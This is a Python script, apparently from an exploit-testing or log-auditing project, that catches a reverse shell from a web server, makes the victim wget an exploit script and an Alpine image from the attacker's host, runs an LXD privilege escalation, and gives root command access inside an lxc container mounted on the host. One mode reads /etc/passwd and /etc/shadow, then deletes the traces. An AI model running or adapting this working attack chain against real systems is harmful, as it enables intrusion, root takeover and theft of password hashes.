import socket, sys, time, os, requests, datetime, re, random, errno
import threading

# DISCLAIMER
# I utilized as base code for this listener the code found on:
# https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html

class color:
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[1;36;48m'
	BOLD = '\033[1;37;48m'
	BLUE = '\033[1;34;48m'
	GREEN = '\033[1;32;48m'
	YELLOW = '\033[1;33;48m'
	RED = '\033[1;31;48m'
	BLACK = '\033[1;30;48m'
	UNDERLINE = '\033[4;37;48m'
	END = '\033[1;37;0m'

def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	print(color.GREEN + '[+]' + color.END + " Listening on port " + str(port))
	con = None
	conn, addr = s.accept()
	print(color.GREEN + '[+]' + color.END + ' Connection received from ',addr)
	
	# Dont print Banner if in repeat mode
	if arguments.repeat == None:
		print(color.CYAN + '=================================================' + color.END)
		print(color.CYAN + '=                Reverse Shell                  =' + color.END)
		print(color.CYAN + '=================================================' + color.END)
	try:
		
		t2.start() # This threads will be daemon, however they will close once the main thread closes, so we don't run into the problem of keeping it always on
		print(color.GREEN + '[+]' + color.END + ' Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
		print(color.GREEN + '[+]' + color.END + ' Waiting for connection')
		time.sleep(0.5)
		
		if general_info['active'] == 'True':
			try:
				requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1))
			except requests.exceptions.ReadTimeout:
			    		pass
			except requests.exceptions.ConnectTimeout:
			    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
			
		commands = ['''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')
''','wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami && pwd\n'] 
		for cmd in commands:
			ans = recvall(conn)
			sys.stdout.write(ans)
			conn.send(cmd.encode())
			time.sleep(0.2)
			
		# Dont print Banner if on repeat mode
		if arguments.repeat == None:
			print(color.CYAN + '''
			
			################################################################
			#							       #
			#                       Explanation			       #
			#							       #
			################################################################
			'''+color.END+ color.BOLD + '''
			In order to have the concept of session, make compound commands.
			Example, if you wanted to list the contents of /tmp
			cd /tmp && ls -la
			
			Otherwise if you type:
			cd /tmp
			ls -la
			
			It will list the contents of directory you were when executing cd /tmp
			''' + color.END)
		
		# If on repeat mode, just execute some commands and exit
		# otherwise allow the user to mess around with terminal
		if arguments.repeat == None:
			while True:
				#Receive data from the target and get user input
				print("", flush=True, end="")
				conn.settimeout(1)
				ans = recvall(conn)
				conn.settimeout(None)
				sys.stdout.write(color.BOLD + ans + color.END)
				print("", flush=True, end="")
				command = input()

				# Send command with 'lxc exec privesc -- sh -c "cd /mnt/root"', in order to execute the command inside the container
				# cd /mnt/root is always forced because the filesystem was mounted at this point, that way the user will always be poiting to the root
				# Since we between commands we lose the concept of session, its always force so we can start from the exact same point
				
				
				if command != "":
					command = "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + command + "\""
				
				command += '\n'
				conn.send(command.encode())
				time.sleep(0.4)
				print(ans.split("\n")[-1])
				print("", flush=True)
			print('[DEBBUG] Exiting While')
		else:
			# Do some random commands while root on the lxc container
			time.sleep(0.5)
			commands = ['pwd\n', 'ls -la\n', 'whoami\n', 'ls -la | grep root | awk \'{ print $9 }\' | head -1 \n', 'which php\n', 'cat /etc/passwd\n', 'cat /etc/shadow\n']
			for cmd in commands:
				ans = recvall(conn)
				command =  "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + cmd
				conn.send(command.encode())
				time.sleep(0.3)
			print(color.YELLOW + '\n[-]' + color.END + ' Unbinding...')
			# Cleanup
			
			cleanup(conn, file_name, general_info, rep)
			time.sleep(0.2)
			s.close()
			print(color.GREEN + '[*]' + color.END + ' Ended exploit')
				
			
	except KeyboardInterrupt:
		if conn:
			print(color.YELLOW + '\n[-]' + color.END + ' Unbinding...')
			# Cleanup
			cleanup(conn, file_name, general_info, 0)
			time.sleep(0.2)
			conn.close()
			s.close()
	finally:
		print(color.GREEN + '[*]' + color.END + ' Closing...')
		conn.close()
		# Not recommended to use this function, however even with sys.exit() the system hangs
		if rep == 0:
			os._exit(0)
		
        
def listen_shell(ip, port, v_ip, v_port, general_info, arguments, secure, rep):
	r_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(ip, r_port):
		r_port = random.randint(1024, 65536)
	s = ''
	if secure:
		s = 's'
	else:
		s = ''
	
	t1 = threading.Thread(target=task, args=(v_ip, v_port, s))
	t2 = threading.Thread(target=task2, args=(ip, r_port))
	t1.start()
	listen(ip, int(port), t2, r_port, get_file_name(), general_info, arguments, rep)
	
def task(v_ip, v_port, s=''):

	time.sleep(1)
	now = datetime.datetime.now()
	print(color.GREEN + '[*]' + color.END + ' Executing Thread for HTTP Request')
	if os.path.exists('./tmp_file_with_dest_url.txt'):
		f = open('./tmp_file_with_dest_url.txt', 'r')
		url = 'http' + s + '://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
		f.close()
		print(color.GREEN + '[*]' + color.END + ' Making request to execute reverse shell ', url)
		# Make the timeout very low in order not to wait for response
		# Make the exception pass so that the user does not get an error 
		try:
	    		requests.get(url, timeout=(1, 1))
		except requests.exceptions.ReadTimeout:
	    		pass
		except requests.exceptions.ConnectTimeout:
	    		sys.exit(color.RED + '[-] We couldn\'t find the exploit in the victim server, check if the server is alive' + color.END)
	    		 
		os.remove('./tmp_file_with_dest_url.txt')
		print(color.GREEN + '[*]' + color.END + ' The exact time before lauching the exploit was: ', now)
		print(color.GREEN + '[*]' + color.END + ' You can use this time to help you filter the syscall logs')
		

	else:
		print(color.RED + '[-]' + color.END + ' URL wasn\'t generated, you might need to run the exploit another time')
		print(color.RED + '[-]' + color.END + ' If the problem persists, please confirm the information you passed')
		
		sys.exit()
		
# This will invoke the a server to download files, used to pass both the exploit and the tar.gz file
def task2(ip, r_port):
	os.system('python3 ./Privilege_Escalation_LXD/file_download_server.py {r_port}'.format(r_port=r_port))
	
def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()
	
def get_file_name():
	files = os.listdir(os.curdir)
	for file in files:
		# search given pattern in the line 
		match = re.search('alpine-.*\.tar\.gz$', file)
		  
		# if match is found
		if match:
			return file
			
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = ''
    while True:
        part = sock.recv(BUFF_SIZE).decode()
        data += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data


def cleanup(conn, file_name, general_info, rep):
	script_dir = os.path.dirname(os.path.realpath(__file__))
	conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;\n'''.encode())
	
	# Only delete local files if it's the last repetition
	# That way we avoid downloading k times the required software
	# However we still delete the on the victim side because
	# It is within our interest for the logging system to detect 
	# the cleanup
	if rep == 0:
		if os.path.exists(script_dir + '/../' + file_name):
			os.remove(script_dir + '/../' + file_name)
		if os.path.exists(script_dir + '/../' + 'build-alpine'):
			os.remove(script_dir + '/../' + 'build-alpine')


	if general_info['active'] == 'True':
		try:
			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
		except requests.exceptions.ReadTimeout:
		    		pass
		except requests.exceptions.ConnectTimeout:
		    	sys.exit(color.RED + '[-]' + color.END + ' Failed to connect to Logging server')



def informAudittingStart(general_info):
	exploit = 'LXD'
	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit
	return url

def informAudittingStop(general_info):
	exploit = 'LXD'
	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit
	return url


		
